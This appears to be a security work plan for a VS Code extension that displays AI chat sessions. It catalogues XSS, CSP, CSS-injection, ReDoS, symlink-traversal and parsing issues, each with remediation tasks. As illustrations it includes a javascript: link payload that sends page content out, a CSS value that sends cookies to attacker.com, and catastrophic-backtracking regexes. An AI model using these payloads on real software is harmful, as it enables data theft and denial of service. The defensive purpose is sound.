# ChatWizard — Security Work Plan

## Overview

ChatWizard reads and renders arbitrary content from AI chat sessions — including user-written prompts, AI-generated code, and embedded URLs — inside VS Code webviews. Webviews run in a sandboxed Chromium context but still execute JavaScript and render HTML. Any unescaped user content reaching a webview is a potential XSS vector that could interact with the VS Code API (`acquireVsCodeApi()`) or exfiltrate data.

This document catalogues all security issues found in the current codebase and provides remediation tasks ordered by severity.

**Threat model:**
- Primary threat: A malicious AI response or crafted `.jsonl` session file that contains XSS payloads, injected HTML, or ReDoS patterns is parsed and rendered
- Secondary threat: Compromised external resources (CDN scripts) executing in the extension's webview context
- Out of scope: Network-level attacks, OS-level privilege escalation

---

## SEC-1 — XSS via Unsanitized Link URLs in Markdown Renderer ✦ CRITICAL ✅

**File:** [src/views/sessionWebviewPanel.ts](src/views/sessionWebviewPanel.ts)

**Problem:** The inline markdown renderer embeds user-controlled URLs directly into `href` attributes without validation. A session message containing `[click me](javascript:alert('xss'))` produces `<a href="javascript:alert('xss')">click me</a>` in the rendered webview.

Inside a VS Code webview, `javascript:` URI execution can call `acquireVsCodeApi().postMessage()` to trigger extension commands, or access and exfiltrate data visible to the webview's JavaScript context.

**Example attack payload in a session file:**
```
[innocuous link text](javascript:acquireVsCodeApi().postMessage({type:'exfil',data:document.body.innerHTML}))
```

### Tasks
- [x] Add a `_sanitizeUrl(url: string): string` function that returns the original URL only if it matches `^https?://` or `^#` or is a relative path with no protocol; otherwise returns `#` (inert) — implemented as `sanitizeUrl()` in `sessionRenderer.ts`
- [x] Apply `sanitizeUrl()` to the captured group in the link regex before it is embedded in the `href` attribute — `applyInline()` now uses a function callback with `sanitizeUrl(url)`
- [x] Link text (group 1) is already HTML-escaped by the earlier pass in `markdownToHtml()` before `applyInline()` runs
- [ ] Add unit tests: `[x](javascript:alert(1))` must render as `<a href="#">x</a>`; `[x](https://example.com)` must pass through; `[x](data:text/html,<h1>)` must be sanitized

**Effort:** 1 day
**Complexity:** Low

---

## SEC-2 — Content Security Policy Uses `'unsafe-inline'` Without Nonce ✦ CRITICAL ✅

**Files:**
- [src/codeblocks/codeBlocksPanel.ts](src/codeblocks/codeBlocksPanel.ts)
- [src/prompts/promptLibraryPanel.ts](src/prompts/promptLibraryPanel.ts)
- [src/timeline/timelineViewProvider.ts](src/timeline/timelineViewProvider.ts)
- [src/analytics/analyticsPanel.ts](src/analytics/analyticsPanel.ts)

**Problem:** All webviews use `script-src 'unsafe-inline'`, which allows any inline `<script>` block to execute regardless of origin — including any injected via XSS. This negates the protection that CSP is meant to provide.

`sessionWebviewPanel.ts` already implements a `_nonce()` helper correctly, but the other four panels do not use it.

### Tasks
- [x] Extract the `_nonce()` helper into a shared utility: `src/views/webviewUtils.ts` — exports `generateNonce(): string`
- [x] In each panel's HTML generation method, call `generateNonce()` once and embed the nonce in:
  - The `<meta http-equiv="Content-Security-Policy">` as `script-src 'nonce-{nonce}'` (replacing `'unsafe-inline'`)
  - Every inline `<script>` tag as `<script nonce="{nonce}">`
- [x] Replace `'unsafe-inline'` for `style-src` with `'nonce-{nonce}'` on inline `<style>` blocks in all 5 panels
- [x] Applied to: `sessionWebviewPanel.ts`, `codeBlocksPanel.ts`, `promptLibraryPanel.ts`, `timelineViewProvider.ts`, `analyticsPanel.ts`
- [ ] Audit all webview HTML templates to confirm no inline event handlers (`onclick=`, `onload=`, etc.) remain
- [ ] Unit test: generated HTML for each panel must contain a `nonce=` attribute on every `<script>` tag and must not contain `'unsafe-inline'` in the CSP

**Effort:** 2 days
**Complexity:** Low-Medium

---

## SEC-3 — External CDN Script Without Subresource Integrity ✦ HIGH ✅

**File:** [src/analytics/analyticsPanel.ts](src/analytics/analyticsPanel.ts)

**Problem:** Chart.js is loaded from `https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js` without an `integrity` attribute. If the CDN is compromised or serves a malicious version, that code runs with full access to the webview's `acquireVsCodeApi()` context.

VS Code's webview CSP explicitly supports SRI, and the VS Code extension security guidelines require it for any external scripts.

### Tasks
- [x] Generated the SHA-384 hash for Chart.js 4.4.3: `JUh163oCRItcbPme8pYnROHQMC6fNKTBWtRG3I3I0erJkzNgL7uxKlNwcrcFKeqF`
- [x] Pinned the Chart.js version explicitly to `@4.4.3` and added `integrity="sha384-..."` and `crossorigin="anonymous"` attributes to the script tag (both `getShellHtml()` and deprecated `getHtml()`)
- [x] Added `CHARTJS_URL` and `CHARTJS_SRI` constants with a comment documenting how to regenerate the hash when upgrading
- [ ] Evaluate bundling Chart.js as a local asset (committed to `media/` or downloaded at build time) to eliminate the CDN dependency entirely — preferred approach for an offline-capable extension
- [ ] If bundled locally, reference via `webview.asWebviewUri()` to comply with webview URI restrictions

**Effort:** 1 day
**Complexity:** Low

---

## SEC-4 — User Settings Injected Directly into CSS ✦ HIGH ✅

**File:** [src/views/sessionWebviewPanel.ts](src/views/sessionWebviewPanel.ts)

**Problem:** Configuration values (color strings) from `vscode.workspace.getConfiguration()` are interpolated directly into inline CSS without validation:

```typescript
const userColor = config.get<string>('userMessageColor', '#007acc');
// ...
.message.user { border-left: 3px solid ${userColor}; }
```

A settings value of `red; } body { background: url('https://attacker.com/exfil?d=' + document.cookie)` would break out of the CSS property and inject arbitrary styles or a resource load.

While VS Code settings are harder for an external actor to modify than chat content, a compromised VS Code settings sync, a malicious workspace `.vscode/settings.json`, or a settings import could supply this value.

### Tasks
- [x] Added `validateColor(value: string, fallback: string): string` in `src/views/webviewUtils.ts` — accepts only `#RGB`, `#RRGGBB`, `rgb(...)`, `rgba(...)` formats
- [x] Applied `validateColor()` to `userMessageColor` and `codeBlockHighlightColor` before sending via postMessage in `sessionWebviewPanel.ts`
- [x] Colors are applied via `style.setProperty()` on custom properties in the webview — safe from direct CSS injection
- [ ] Apply `validateColor()` to `tooltipLabelColor` in the tree provider tooltip rendering
- [ ] Unit test: a color value with embedded `}` or `url()` must be rejected and replaced with the default

**Effort:** 1 day
**Complexity:** Low

---

## SEC-5 — ReDoS via User-Controlled Regex in Search ✦ HIGH ✅

**Files:**
- [src/search/searchPanel.ts](src/search/searchPanel.ts)
- [src/search/fullTextEngine.ts](src/search/fullTextEngine.ts)

**Problem:** When a search query starts with `/`, it is treated as a regex and passed directly to `new RegExp(query.text)`. Certain regex patterns cause catastrophic backtracking that blocks the Node.js event loop (which is single-threaded in the extension host), freezing the entire VS Code window.

Example patterns that cause catastrophic backtracking:
- `/(a+)+b/` — exponential backtracking
- `/^(a|a)*$/` — exponential with boundary
- `/(x+x+)+y/` — well-known ReDoS pattern

### Tasks
- [x] Before compiling user-supplied regex, validate against known-safe constraints:
  - `MAX_REGEX_LEN = 200` — pattern length limit
  - `RE_REDOS_PATTERNS` — structural check rejecting nested quantifiers (`(a+)+`) and quantified alternation (`(a|b)+`)
  - Implemented in `isReDoS(pattern)` helper in `fullTextEngine.ts`
- [x] `new RegExp(query.text)` already wrapped in try/catch — rejecting `isReDoS` patterns returns `{ results: [], totalCount: 0 }` early
- [x] Added elapsed-time check inside the session loop: aborts after `REGEX_SEARCH_TIMEOUT_MS = 1_000` ms
- [ ] Surface "Search timed out" as a user-visible message in the QuickPick UI
- [ ] Unit test: submitting `/(a+)+b/` as a search must return an error message within 100 ms, not freeze

**Effort:** 2 days
**Complexity:** Medium

---

## SEC-6 — Path Traversal via Symlinks in Session Discovery ✦ MEDIUM ✅

**File:** [src/watcher/fileWatcher.ts](src/watcher/fileWatcher.ts)

**Problem:** `collectClaudeSessions()` reads all directories under the configured Claude projects path using `fs.readdirSync`. If the projects directory or any subdirectory contains a symlink pointing outside the base directory (e.g., `~/.claude/projects/evil -> /etc`), the extension will follow it and attempt to parse arbitrary files as JSONL sessions.

This is a real risk on shared developer machines or if a malicious workspace modifies the user's home directory.

### Tasks
- [x] Added `_isSafeFilePath(resolvedBase, filePath)` and `_isSafeFilePathAsync()` static helpers to `ChatWizardWatcher` — use `fs.realpathSync` / `fs.promises.realpath` and verify result starts with the resolved base
- [x] Applied in `collectClaudeSessionsAsync()` — resolves base once, checks each file before parsing
- [x] Applied in `collectCopilotSessionsAsync()` — resolves per-workspace base, checks each session file
- [x] Applied in sync versions `collectClaudeSessions()` and `collectCopilotSessions()` for live-update code paths
- [x] Logs `[security]` warning when a path escape is detected — does not throw, just skips the file
- [ ] Unit test: a session file path that resolves outside the base directory must be silently skipped

**Effort:** 1 day
**Complexity:** Low

---

## SEC-7 — Unbounded JSON Parsing of Session Files ✦ MEDIUM ✅

**Files:**
- [src/parsers/copilot.ts](src/parsers/copilot.ts)
- [src/parsers/claude.ts](src/parsers/claude.ts)

**Problem:** Session files are parsed with `JSON.parse()` on each line without any size or depth limits. A crafted JSONL file with deeply nested JSON objects can cause stack overflow (V8's parser is recursive). An extremely large single-line JSON object can exhaust heap memory.

The `deepSet()` function in `copilot.ts` accepts arbitrary `keys` arrays and will happily create sparse arrays with indices up to 2^32, exhausting memory.

### Tasks
- [x] Before calling `JSON.parse()`, check `line.length` against `MAX_LINE_CHARS = 1_000_000` (1 MB); skip lines that exceed this with a warning — applied in both `copilot.ts` and `claude.ts`
- [ ] After parsing, verify that the resulting object does not exceed a depth limit — implement a `maxDepth(obj, limit)` check before accessing fields on the parsed result
- [x] In `deepSet()`, added guard: `if (keys.length === 0 || keys.length > MAX_DEEPSET_DEPTH) { return; }` (MAX_DEEPSET_DEPTH = 64)
- [x] For array indices in `deepSet()`, added: `if (key < 0 || key > MAX_ARRAY_INDEX) { return; }` (MAX_ARRAY_INDEX = 100_000) on both traversal and assignment
- [ ] Unit test: a JSONL line with 1000-level deep nesting must be skipped gracefully; a line > 5 MB must be skipped with a log warning

**Effort:** 1 day
**Complexity:** Low

---

## SEC-8 — Telemetry File Contains Session Metadata ✦ MEDIUM ✅

**File:** [src/telemetry/telemetryRecorder.ts](src/telemetry/telemetryRecorder.ts)

**Problem:** The telemetry recorder writes events to a local JSONL file in `globalStorageUri.fsPath`. If the recorded events include session IDs, file paths, or message counts, these constitute sensitive metadata about the user's AI usage patterns. The file is stored in VS Code's global storage directory, which may be included in automated backups or synced via workspace sync tools.

### Tasks
- [x] Audited every `record()` call site — no concrete calls currently exist in the codebase (recorder is wired but not actively recording anything)
- [x] Added `RECORDED FIELDS` documentation comment in `telemetryRecorder.ts` enumerating what callers MUST NOT pass (file paths, usernames, session IDs verbatim, PII)
- [x] Added `rotate()` method implementing automatic log rotation: discards entries older than `MAX_LOG_AGE_MS` (30 days) and rewrites the file when its size exceeds `MAX_LOG_BYTES` (1 MB)
- [x] `rotate()` is called automatically when `setEnabled(true)` is called (e.g., on extension activation when telemetry is enabled)
- [x] `chatwizard.enableTelemetry` already defaults to `false`
- [ ] Document in the README exactly what is recorded in the telemetry file and how to locate/delete it

**Effort:** 2 days
**Complexity:** Low

---

## SEC-9 — Exported Markdown Contains Unescaped Session Content ✦ LOW ✅

**File:** [src/export/markdownSerializer.ts](src/export/markdownSerializer.ts)

**Problem:** `serializeSession()` writes message content directly into a Markdown file with role headers. If a message contains HTML tags or raw markdown link syntax like `[text](javascript:...)`, these are faithfully reproduced in the exported file. When the exported file is opened in a Markdown preview that renders HTML (GitHub, VS Code Markdown Preview, Typora), the XSS payload is active.

### Tasks
- [x] Added `EXPORT_HEADER` HTML comment at the top of all exported files: `<!-- ChatWizard export — AI-generated content. Render in a trusted environment only. -->`
- [x] Added `sanitizeForExport(text): string` that strips Markdown links with unsafe schemes — replaces `[text](javascript:...)` with `[text]`, preserving only `http(s)://`, `ftp://`, `#`, and relative paths
- [x] Added `sanitize = true` default parameter to `serializeSession()` — sanitization is applied automatically
- [x] Added `sanitize = true` default parameter to `serializeSessions()` — passes through to `serializeSession()`
- [ ] Document this behavior in the README: "Exported Markdown files contain verbatim session content and should be treated as untrusted input in downstream Markdown renderers"

**Effort:** 1 day
**Complexity:** Low

---

## SEC-10 — No Per-Workspace Enable/Disable ✦ LOW ✅

**File:** [package.json](package.json)

**Problem:** The extension activates on `onStartupFinished` and on multiple `onView:` events, meaning it starts parsing and indexing files from `~/.claude/projects` immediately on VS Code launch. There is no mechanism for users to disable the extension for a specific workspace (e.g., a work machine where they don't want session data indexed from personal AI tools, or vice versa).

This is a privacy concern when the extension is installed globally across workspaces with mixed personal/professional contexts.

### Tasks
- [x] Add a `chatwizard.enabled` boolean setting (default `true`) that, when set to `false` at workspace level, prevents the extension from reading or indexing any files for that workspace
- [x] Check this setting at the start of `start()` in the file watcher; bail out early with an info log if disabled
- [x] Allow per-source disabling: `chatwizard.indexCopilot` and `chatwizard.indexClaude` booleans (both default `true`) so users can opt out of one source without disabling the entire extension
- [ ] Document the workspace-level override capability in the README

**Effort:** 2 days
**Complexity:** Low

---

## Summary — Priority Order

| ID | Issue | File | Effort | Priority | Severity |
|----|-------|------|--------|----------|----------|
| SEC-1 | XSS via link URLs | sessionWebviewPanel.ts | 1 day | P0 | Critical |
| SEC-2 | CSP uses unsafe-inline | 4 panel files | 2 days | P0 | Critical |
| SEC-3 | Chart.js no SRI | analyticsPanel.ts | 1 day | P0 | High |
| SEC-4 | CSS setting injection | sessionWebviewPanel.ts | 1 day | P0 | High |
| SEC-5 | ReDoS via user regex | searchPanel.ts + fullTextEngine.ts | 2 days | P0 | High |
| SEC-6 | Path traversal via symlinks | fileWatcher.ts | 1 day | P1 | Medium |
| SEC-7 | Unbounded JSON parsing | copilot.ts + claude.ts | 1 day | P1 | Medium |
| SEC-8 | Telemetry metadata exposure | telemetryRecorder.ts | 2 days | P1 | Medium |
| SEC-9 | Exported Markdown XSS | markdownSerializer.ts | 1 day | P2 | Low |
| SEC-10 | No workspace-level disable | package.json + extension.ts | 2 days | P2 | Low |

**Total estimated effort: ~14 developer-days**

All P0 items should be resolved before the extension is published to the VS Code Marketplace.
